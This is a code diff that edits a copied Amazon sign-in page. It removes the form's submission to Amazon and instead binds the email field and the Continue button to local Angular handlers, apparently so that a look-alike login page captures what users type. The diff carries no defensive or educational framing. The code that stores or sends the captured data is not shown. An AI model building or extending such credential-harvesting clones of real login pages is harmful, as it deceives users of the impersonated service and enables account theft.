@@ -70,8 +70,8 @@
                 <form
                   name="signIn"
                   method="post"
+                  ng-submit="submit()"
                   novalidate
-                  action="https://www.amazon.com/ap/signin"
                   class="auth-validate-form auth-real-time-validation a-spacing-none"
                 >
                   <input
@@ -117,11 +117,13 @@
                           <label for="ap_email" class="a-form-label">
                             Email or mobile phone number
                           </label>
+
                           <input
-                            type="email"
+                            type="text"
                             maxlength="128"
-                            id="ap_email"
-                            name="email"
+                            ng-model="text"
+                            id="text"
+                            name="text"
                             tabindex="1"
                             class="a-input-text a-span12 auth-autofocus auth-required-field"
                           />
@@ -153,8 +155,10 @@
                         <div class="a-section">
                           <span
                             id="continue"
+                            ng-click="redirectToPassword()"
                             class="a-button a-button-span12 a-button-primary"
-                            ><span class="a-button-inner"
+                          >
+                            <span class="a-button-inner"
                               ><input
                                 id="continue"
                                 tabindex="5"
